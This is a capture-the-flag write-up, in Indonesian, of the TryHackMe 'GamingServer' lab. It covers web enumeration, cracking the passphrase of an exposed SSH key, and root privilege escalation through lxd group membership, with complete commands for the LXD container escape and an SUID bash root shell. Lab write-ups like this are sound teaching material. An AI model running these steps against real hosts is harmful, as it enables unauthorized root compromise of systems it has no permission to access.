# GamingServer — TryHackMe Writeup

**Difficulty:** Easy  
**Kategori:** Web, SSH, Privilege Escalation  

---

## Recon

Diawali dengan nmap untuk melihat service apa saja yang berjalan

```bash
nmap -sC -sV TARGET -T4
```

![nmap](images/nmap.png)

Ditemukan:
- 22/tcp → SSH
- 80/tcp → HTTP

Web server jadi attack surface utama.

---

## Enumerasi Web

### Source Code

```bash
curl http://TARGET
```

![source](images/source.png)

Ditemukan komentar:

```
john, please add some actual content...
```

Kandidat Username : `john`

---

### /uploads Directory

![uploads](images/uploads.png)

Directory listing aktif, ditemukan:
- `dict.lst` (wordlist)
- `manifesto.txt` (tidak relevan)

---

### Wordlist Reuse

![wordlist](images/wordlist.png)

Alih-alih pakai wordlist generic, di case ini menggunakan wordlist dari target untuk enumerasi.

Ini sering jadi intentional hint di CTF.

---

### Directory Brute Force

```bash
gobuster dir -u http://TARGET -w dict.lst
```

![gobuster](images/gobuster.png)

Ditemukan endpoint:
```
/secret
```

---

### RSA Private Key

![rsa](images/rsa.png)

Di dalam `/secret` terdapat RSA private key yang terenkripsi.

---

## Initial Access

### Crack Passphrase

```bash
ssh2john id_rsa > hash.txt
john --wordlist=dict.lst hash.txt
```

![john](images/john.png)

Passphrase:
```
letmein
```

Weak passphrase + reused wordlist = entry point

---

### SSH Login

```bash
ssh -i id_rsa john@TARGET
```

---

### User Flag

```bash
cat user.txt
```

![user](images/user.png)

---

## Privilege Escalation

### Enumerasi

```bash
id
```

User `john` berada di group `lxd`.
0uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
Ini critical misconfiguration karena LXD bisa digunakan untuk container escape.

---

### Exploit LXD

```bash
lxc image import alpine.tar.gz --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
```

Masuk container:

```bash
lxc exec privesc /bin/sh
chmod +s /mnt/root/bin/bash
exit
```

Spawn root shell:

```bash
/bin/bash -p
```

---

### Root Access

```bash
id
# euid=0(root)
```

---

### Root Flag

```bash
cat /root/root.txt
```

![root](images/root.png)

---

## Attack Flow

Recon → Username → Wordlist → Gobuster → RSA Key → Crack → SSH → LXD → Root

---

## Takeaways

- Informasi kecil di source code bisa jadi foothold
- Wordlist dari target lebih powerful daripada wordlist umum
- Weak passphrase masih sering jadi celah
- Membership `lxd` = privilege escalation instan
